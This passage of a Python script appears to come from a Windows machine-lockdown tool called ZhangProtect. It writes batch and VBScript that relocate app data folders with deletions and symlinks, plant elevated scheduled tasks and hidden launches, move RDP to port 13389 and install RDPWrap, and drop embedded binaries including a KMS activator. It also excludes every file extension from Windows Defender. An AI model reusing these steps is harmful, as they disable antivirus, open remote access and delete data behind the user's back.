            + "%datadir%:\\StorageRedirect\\KuGou8-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%AppData%\\KuGou8"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\KuGou8-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\KuGou8-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%AppData%\\KuGou8"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\KuGou8-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%AppData%\\KuGou8\\linkflag-%username%"
            + chr(34)
            + ""
        )
        StorageRedirect3 = (
            "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Edge-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%LocalAppData%\\Microsoft\\Edge\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Edge-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Edge-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%LocalAppData%\\Microsoft\\Edge"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Edge-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Edge-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%LocalAppData%\\Microsoft\\Edge"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Edge-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%LocalAppData%\\Microsoft\\Edge\\linkflag-%username%"
            + chr(34)
            + ""
        )
        StorageRedirect4 = (
            "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\clash-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%userprofile%\\.config\\clash\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\clash-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\clash-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%userprofile%\\.config\\clash"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\clash-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\clash-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%userprofile%\\.config\\clash"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\clash-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%userprofile%\\.config\\clash\\linkflag-%username%"
            + chr(34)
            + ""
        )
        StorageRedirect5 = (
            "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\VMware-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%AppData%\\VMware\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\VMware-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\VMware-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%AppData%\\VMware"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\VMware-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\VMware-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%AppData%\\VMware"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\VMware-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%AppData%\\VMware\\linkflag-%username%"
            + chr(34)
            + ""
        )
        StorageRedirect6 = (
            "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Tencent-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%AppData%\\Tencent\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Tencent-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Tencent-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%AppData%\\Tencent"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Tencent-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Tencent-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%AppData%\\Tencent"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Tencent-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%AppData%\\Tencent\\linkflag-%username%"
            + chr(34)
            + ""
        )
        StorageRedirect7 = (
            "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Wlansvc\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%systemdrive%\\ProgramData\\Microsoft\\Wlansvc\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Wlansvc\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Wlansvc\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%systemdrive%\\ProgramData\\Microsoft\\Wlansvc"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Wlansvc\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Wlansvc"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%systemdrive%\\ProgramData\\Microsoft\\Wlansvc"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Wlansvc"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%systemdrive%\\ProgramData\\Microsoft\\Wlansvc\\linkflag-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\OneDrive-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%LocalAppData%\\Microsoft\\OneDrive\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\OneDrive-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\OneDrive-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%LocalAppData%\\Microsoft\\OneDrive"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\OneDrive-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\OneDrive-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%LocalAppData%\\Microsoft\\OneDrive"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\OneDrive-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%LocalAppData%\\Microsoft\\OneDrive\\linkflag-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\upupoo-wallpaper-shop-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%AppData%\\upupoo-wallpaper-shop\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\upupoo-wallpaper-shop-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\upupoo-wallpaper-shop-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%AppData%\\upupoo-wallpaper-shop"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\upupoo-wallpaper-shop-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\upupoo-wallpaper-shop-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%AppData%\\upupoo-wallpaper-shop"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\upupoo-wallpaper-shop-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%AppData%\\upupoo-wallpaper-shop\\linkflag-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%AppData%\\MinecraftPE_Netease\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%AppData%\\MinecraftPE_Netease"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%AppData%\\MinecraftPE_Netease"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%AppData%\\MinecraftPE_Netease\\linkflag-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease_Editor-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%AppData%\\MinecraftPE_Netease_Editor\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease_Editor-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease_Editor-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%AppData%\\MinecraftPE_Netease_Editor"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease_Editor-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease_Editor-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%AppData%\\MinecraftPE_Netease_Editor"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\MinecraftPE_Netease_Editor-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%AppData%\\MinecraftPE_Netease_Editor\\linkflag-%username%"
            + chr(34)
        )
        regstartupvb = (
            "proname = "
            + chr(34)
            + "Protect.exe"
            + chr(34)
            + ""
            + chr(10)
            + "Set wmi = GetObject("
            + chr(34)
            + "winmgmts:{impersonationlevel=impersonate}!\\"
            + "\\.\\root\\cimv2"
            + chr(34)
            + ")"
            + chr(10)
            + "Set procs = wmi.execquery("
            + chr(34)
            + "select * from win32_process"
            + chr(34)
            + ")"
            + chr(10)
            + "flag = True"
            + chr(10)
            + "For Each proc In procs"
            + chr(10)
            + "If StrComp(proc.Name, proname) = 0 Then"
            + chr(10)
            + "flag = False"
            + chr(10)
            + "Exit For"
            + chr(10)
            + "End If"
            + chr(10)
            + "Next"
            + chr(10)
            + "Set wmi = Nothing"
            + chr(10)
            + "If flag Then"
            + chr(10)
            + "Wscript.sleep 10000"
            + chr(10)
            + "CreateObject("
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + ").ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + ","
            + chr(34)
            + "/c schtasks /run /tn ZhangProtect\\Protect"
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ",runas,0"
            + chr(10)
            + "Wscript.sleep 10000"
            + chr(10)
            + "CreateObject("
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + ").ShellExecute"
            + chr(34)
            + ProtectExe
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ",runas,0"
            + chr(10)
            + "End If"
            + chr(10)
            + "CreateObject("
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + ").ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + ","
            + chr(34)
            + "/c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f"
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ",runas,0"
            + chr(10)
            + "CreateObject("
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + ").ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + ","
            + chr(34)
            + "/c SysTray"
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ",runas,0"
            + chr(10)
            + "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + chr(44)
            + chr(34)
            + "/c "
            + ProtectBAT
            + "<"
            + AutoAnswer
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
            + chr(10)
            + "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + memreduct
            + chr(34)
            + chr(44)
            + chr(34)
            + "/minimized"
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
            + chr(10)
            + "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + DesktopOK
            + chr(34)
            + chr(44)
            + chr(34)
            + "-bg -startup"
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
        )
        StorageRedirect = (
            StorageRedirect1
            + chr(10)
            + StorageRedirect2
            + chr(10)
            + StorageRedirect3
            + chr(10)
            + StorageRedirect4
            + chr(10)
            + StorageRedirect5
            + chr(10)
            + StorageRedirect6
            + chr(10)
            + StorageRedirect7
        )
        AllCommands = (
            datadis
            + chr(10)
            + "set hidesettingflag="
            + chr(34)
            + str(hidesettingflag)
            + chr(34)
            + chr(10)
            + 'cmd /c "'
            + RDPWrapInstaller
            + '"'
            + chr(10)
            + "cmd "
            + ProtectSchTask
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f"
            + chr(10)
            + "SysTray"
            + chr(10)
            + BatKeeperRunsch
            + chr(10)
            + "regedit /s "
            + chr(34)
            + regfixfile
            + chr(34)
            + chr(10)
            + ProtectKeepersch
            + chr(10)
            + WifiKeepersch
            + chr(10)
            + UsbChange
            + chr(10)
            + AppProtectA
            + chr(10)
            + AppProtectB
            + chr(10)
            + AppProtectC
            + chr(10)
            + autoshutdown
            + chr(10)
            + 'schtasks /create /tn ZhangProtect\ErrorAutoFix /xml "'
            + ErrorAutoFixXml
            + '" /f'
            + chr(10)
            + "schtasks /delete /tn 360safe\\360APMainProg /f"
            + chr(10)
            + "if exist "
            + AutoPreCFlag
            + " (schtasks /Change /tn ZhangProtect\\AutoPreA /Disable"
            + chr(10)
            + "schtasks /Change /tn ZhangProtect\\AutoPreB /Disable"
            + chr(10)
            + "schtasks /Change /tn ZhangProtect\\AutoPreC /Disable"
            + chr(10)
            + ") else ("
            + chr(10)
            + "if %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (icacls %systemdrive%\\ /setintegritylevel M)"
            + chr(10)
            + "if %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (icacls %datadir%:\\ /setintegritylevel M)"
            + chr(10)
            + "if %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (if exist "
            + closewifi
            + " (reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v SettingsPageVisibility /f) else (reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v SettingsPageVisibility /t REG_SZ /d hide:network-mobilehotspot /f)) else (reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v SettingsPageVisibility /f)"
            + chr(10)
            + autochangepreA
            + chr(10)
            + autochangepreB
            + chr(10)
            + autochangepreC
            + ")"
            + chr(10)
            + autochangepreD
            + chr(10)
            + MaketheLink
            + chr(10)
            + MyComputerClean
            + chr(10)
            + regstartupcom
            + chr(10)
            + StorageRedirect
            + chr(10)
            + "if exist "
            + excludeflag
            + " (echo) else (for /f "
            + chr(34)
            + "tokens=4 delims=\\"
            + chr(34)
            + " %%x in ("
            + chr(39)
            + "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes"
            + chr(39)
            + ") do (reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions"
            + chr(34)
            + " /t REG_DWORD /v %%x /d 0 /f >nul) & echo 1 >"
            + excludeflag
            + ")"
            + chr(10)
            + "gpupdate /force /wait:0"
        )
        AllSchrun = AutoPreDrun + chr(10) + UsbChangerRun
        ErrorAutoFixXml_text = (
            "<?xml version="
            + chr(34)
            + "1.0"
            + chr(34)
            + " encoding="
            + chr(34)
            + "UTF-16"
            + chr(34)
            + "?>"
            + chr(10)
            + "<Task version="
            + chr(34)
            + "1.4"
            + chr(34)
            + " xmlns="
            + chr(34)
            + "http://www.baidu.com"
            + chr(34)
            + ">"
            + chr(10)
            + "  <RegistrationInfo>"
            + chr(10)
            + "    <URI>\\ZhangProtect\\ErrorAutoFix</URI>"
            + chr(10)
            + "  </RegistrationInfo>"
            + chr(10)
            + "  <Triggers>"
            + chr(10)
            + "    <EventTrigger>"
            + chr(10)
            + "      <Enabled>true</Enabled>"
            + chr(10)
            + "      <Subscription>&lt;QueryList&gt;&lt;Query Id="
            + chr(34)
            + "0"
            + chr(34)
            + " Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;&lt;Select Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;*[System[Provider[@Name='Microsoft-Windows-Power-Troubleshooter'] and EventID=1]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>"
            + chr(10)
            + "    </EventTrigger>"
            + chr(10)
            + "    <EventTrigger>"
            + chr(10)
            + "      <Enabled>true</Enabled>"
            + chr(10)
            + "      <Subscription>&lt;QueryList&gt;&lt;Query Id="
            + chr(34)
            + "0"
            + chr(34)
            + " Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;&lt;Select Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;*[System[Provider[@Name='Microsoft-Windows-Kernel-Power'] and EventID=107]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>"
            + chr(10)
            + "    </EventTrigger>"
            + chr(10)
            + "    <EventTrigger>"
            + chr(10)
            + "      <Enabled>true</Enabled>"
            + chr(10)
            + "      <Subscription>&lt;QueryList&gt;&lt;Query Id="
            + chr(34)
            + "0"
            + chr(34)
            + " Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;&lt;Select Path="
            + chr(34)
            + "System"
            + chr(34)
            + "&gt;*[System[Provider[@Name='Microsoft-Windows-Kernel-Power'] and EventID=41]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>"
            + chr(10)
            + "    </EventTrigger>"
            + chr(10)
            + "  </Triggers>"
            + chr(10)
            + "  <Principals>"
            + chr(10)
            + "    <Principal id="
            + chr(34)
            + "Author"
            + chr(34)
            + ">"
            + chr(10)
            + "      <UserId>S-1-5-18</UserId>"
            + chr(10)
            + "      <RunLevel>HighestAvailable</RunLevel>"
            + chr(10)
            + "    </Principal>"
            + chr(10)
            + "  </Principals>"
            + chr(10)
            + "  <Settings>"
            + chr(10)
            + "    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>"
            + chr(10)
            + "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
            + chr(10)
            + "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>"
            + chr(10)
            + "    <AllowHardTerminate>false</AllowHardTerminate>"
            + chr(10)
            + "    <StartWhenAvailable>false</StartWhenAvailable>"
            + chr(10)
            + "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
            + chr(10)
            + "    <IdleSettings>"
            + chr(10)
            + "      <StopOnIdleEnd>false</StopOnIdleEnd>"
            + chr(10)
            + "      <RestartOnIdle>false</RestartOnIdle>"
            + chr(10)
            + "    </IdleSettings>"
            + chr(10)
            + "    <AllowStartOnDemand>true</AllowStartOnDemand>"
            + chr(10)
            + "    <Enabled>true</Enabled>"
            + chr(10)
            + "    <Hidden>false</Hidden>"
            + chr(10)
            + "    <RunOnlyIfIdle>false</RunOnlyIfIdle>"
            + chr(10)
            + "    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>"
            + chr(10)
            + "    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>"
            + chr(10)
            + "    <WakeToRun>true</WakeToRun>"
            + chr(10)
            + "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>"
            + chr(10)
            + "    <Priority>7</Priority>"
            + chr(10)
            + "  </Settings>"
            + chr(10)
            + "  <Actions Context="
            + chr(34)
            + "Author"
            + chr(34)
            + ">"
            + chr(10)
            + "    <Exec>"
            + chr(10)
            + "      <Command>"
            + ErrorAutoFix
            + "</Command>"
            + chr(10)
            + "    </Exec>"
            + chr(10)
            + "  </Actions>"
            + chr(10)
            + "</Task>"
        )
        ErrorAutoFixBat_text = (
            "taskkill /f /im powershell.exe /t"
            + chr(10)
            + "taskkill /f /im 360AP.exe /t"
            + chr(10)
            + "powershell C:\\Windows\\Protect\\StopWifiShare.ps1"
            + chr(10)
            + "powershell Restart-NetAdapter -name "
            + chr(34)
            + "*"
            + chr(34)
            + ""
            + chr(10)
            + "schtasks /End /tn ZhangProtect\\Protect"
            + chr(10)
            + "taskkill /f /im Protect.exe /t"
            + chr(10)
            + "schtasks /Run /tn ZhangProtect\\Protect /I"
            + chr(10)
            + "taskkill /f /im cmd.exe /t"
        )
        try:
            with open(ProtectControl, "wb") as f:
                f.write(base64.b64decode(ZhangProtectControl_File))
        except Exception as e:
            log(
                logs,
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        # ProtectSysDispatch
        try:
            with open(ProtectSysDispatch, "wb") as f:
                f.write(base64.b64decode(SysDispatch_File))
        except Exception as e:
            log(
                logs,
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        # 写入并刷新文件
        try:
            memreductiniw = """
            [memreduct]
            AutorunIsEnabled=false
            SkipUacIsEnabled=true
            IsShowDonateAtStartup=false
            SettingsLastPage=102
            CheckUpdatesLast=1659777607
            AlwaysOnTop=false
            ReductConfirmation=false
            CheckUpdates=false
            Language=Chinese (Simplified)
            ReductMask=7
            AutoreductEnable=true
            AutoreductValue=85
            AutoreductIntervalEnable=true
            AutoreductIntervalValue=15
            HotkeyCleanEnable=true
            HotkeyClean=624
            TrayUseTransparency=false
            TrayShowBorder=false
            TrayRoundCorners=true
            TrayChangeBg=true
            TrayUseAntialiasing=true
            TrayColorText=16777215
            TrayColorBg=4227072
            TrayColorWarning=4227327
            TrayColorDanger=2366701
            TrayActionDc=1
            TrayActionMc=1
            TrayLevelWarning=85
            TrayLevelDanger=90
            BalloonCleanResults=false
            StatisticLastReduct=1679727843
            CheckUpdatesPeriod=0
            """

            b64_to_file(DesktopOK, DesktopOKFile)
            with open(memreductini, "w", encoding="utf-8") as f:
                f.write(memreductiniw)
            if not os.path.exists(memreducti18n):
                os.mkdir(memreducti18n)
            b64_to_file(memreduct, memreductFile)
        except Exception as e:
            log(
                logs,
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )

        try:
            rdtimeout = 0
            rdflag = True
            while ((not os.path.isfile(RDPreg)) or rdflag) and rdtimeout < 30:
                os.popen(
                    'regedit /E "'
                    + RDPreg
                    + '" "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"'
                )
                rdflag = False
                rdtimeout += 1
            with open(RDPreg, "r", encoding="utf-16") as f:
                rdpexpregr = f.readlines()
            rdpexpregfix = ""
            for i in rdpexpregr:
                i = str(i)
                if "PortNumber" in i:
                    i = '"PortNumber"=dword:0000344d\n'
                rdpexpregfix += i
            if "RDP-Tcp" in rdpexpregfix and (not "RDP-Tcp-13389" in rdpexpregfix):
                rdpexpregfix = rdpexpregfix.replace("RDP-Tcp", "RDP-Tcp-13389")
            with open(RDPreg, "w", encoding="utf-16") as f:
                f.write(rdpexpregfix)
            os.popen('regedit /s "' + RDPreg + '"')
        except Exception as e:
            log(
                logs,
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        b64zip_to_file(RDPWrapZipFile, RDPWrapZip)
        b64zip_to_file(CCleanerZipFile, CCleanerZip)
        b64zip_to_file(ikun_icon_zip, iKun_icon_zip_f)
        b64zip_to_file(nmyuZip, nmyuf)
        b64zip_to_file(SnapShotZip, SnapShotf)
        b64_to_file(npcap, npcapzip)
        b64_to_file(ikun_wav_file, ikun_wav)
        b64_to_file(NSudo, NSudoZipf)
        b64_to_file(zip7exe, zip7f)
        b64_to_file(zip7dll, zip7dllf)
        b64_to_file(wallpaper_example, examplemp4f)
        b64_to_file(wallpaper_example_photo, examplemp4photof)
        b64_to_file(nlxjt_ttf, nlxjtf)
        b64_to_file(pingfang_ttf, pingfangf)
        b64_to_file(ikun_wallpapermp4, iKun_wallpaper_mp4_f)
        b64_to_file(ikun_wallpaperphoto, iKun_wallpaper_photo_f)
        b64_to_file(KMSActivatorExe, KMSActivatorf)
        b64_to_file(ap_360_installer, APInstallerf)
        b64_to_file(DGuardInstallexe, DGuardInstallf)
        b64_to_file(Scan_app, Zhang_lan_scan_f)
        ap_360_repair()
        try:
            for i in os.listdir(datadir + ":\\"):
                time.sleep(0.001)
                i += "\\desktop.ini"
                try:
                    os.popen('attrib -s -h -r "' + i + '"')
                    with open(i, "w", encoding="gbk") as f:
                        f.write(
                            "[.ShellClassInfo]"
                            + chr(10)
                            + "InfoTip=这是由ZhangProtect创建并保护的文件夹"
                            + chr(10)
                            + "IconResource="
                            + ProtectExe
                            + ",0"
                        )
                    os.popen('attrib +s +h +r "' + i + '"')
                except Exception as e:
                    log(
                        logs,
                        str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                    )
        except Exception as e:
            log(
                logs,
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        for i in ["Files", "Important", "StorageRedirect", "学科文件夹"]:
            if i == "学科文件夹" and os.path.isfile(datadir + ":\\" + i + "\\hide"):
                os.popen("attrib +s +h +r " + chr(34) + datadir + ":\\" + i + chr(34))
            else:
                os.popen("attrib -s -h -r " + chr(34) + datadir + ":\\" + i + chr(34))

        MainTainCleanBat = (
            "@echo off"
            + chr(10)
